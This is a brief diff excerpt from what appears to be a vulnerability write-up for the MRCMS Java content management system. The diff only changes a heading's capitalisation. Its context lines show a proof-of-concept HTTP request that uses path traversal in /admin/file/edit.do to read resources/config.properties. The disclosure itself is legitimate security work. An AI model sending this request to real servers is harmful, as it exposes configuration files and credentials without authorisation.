@@ -7,7 +7,7 @@ MRCMS 是一款Java开发的内容管理系统，采用数据模型+模板+插�
 https://gitee.com/marker/MRCMS
 ```
 
-## poc
+## POC
 ```
 GET /admin/file/edit.do?path=../resources/config.properties&name= HTTP/1.1
 Host: 127.0.0.1:8080
